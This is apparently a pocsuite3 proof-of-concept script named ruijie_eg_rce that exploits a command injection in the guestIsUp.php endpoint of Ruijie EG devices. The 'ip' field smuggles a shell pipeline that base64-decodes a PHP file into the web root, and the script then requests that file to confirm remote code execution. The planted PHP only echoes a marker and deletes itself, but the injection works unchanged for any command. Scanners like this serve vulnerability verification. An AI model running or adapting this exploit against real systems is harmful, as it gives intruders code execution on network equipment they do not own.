#!/usr/bin/env python
# -*- coding:utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests, random_str
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import base64


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''ruijie_eg_rce'''''
    desc = ''''''
    severity = '''high'''
    vulType = '''code-exec'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = ''''''
    appVersion = ''''''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        r1 = random_str(5)
        r2 = random_str(5)
        phpcode = f"<?php echo '{r1}'; unlink(__FILE__); ?>"
        payload = base64.b64encode(phpcode.encode())
        payload_url = make_verify_url(self.url, '/guest_auth/guestIsUp.php', mod=0)
        data = f"ip=127.0.0.1|echo '{payload.decode()}' | base64 -d > {r2}.php&mac=00-00"
        resp0 = requests.post(payload_url, data=data, allow_redirects=False, verify=False, timeout=15)
        if resp0.status_code == 200:
            verify_url = make_verify_url(self.url, f'{r2}.php', mod=0)
            resp = requests.get(verify_url, allow_redirects=False, verify=False, timeout=15)
            if resp.status_code == 200 and r1 in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(TestPOC)
